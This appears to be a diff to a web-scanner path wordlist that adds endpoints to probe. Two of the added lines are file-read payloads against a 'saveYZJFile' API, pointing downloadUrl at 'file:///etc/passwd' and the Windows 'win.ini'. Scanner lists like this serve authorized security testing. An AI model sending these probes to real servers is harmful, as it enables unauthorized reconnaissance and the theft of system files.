@@ -21,6 +21,10 @@
 /systemc_sitep/index.php/amaininit
 /systemc_sitep/index.php
 /systemc_sitep/
+/listener/cluster_manage.php
+/acc/clsf/report/datasource.php
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:////etc/passwd
 /_layouts/15/Picker.aspx
 /ThinkPHP/LICENSE.txt
 /include/config.inc.php
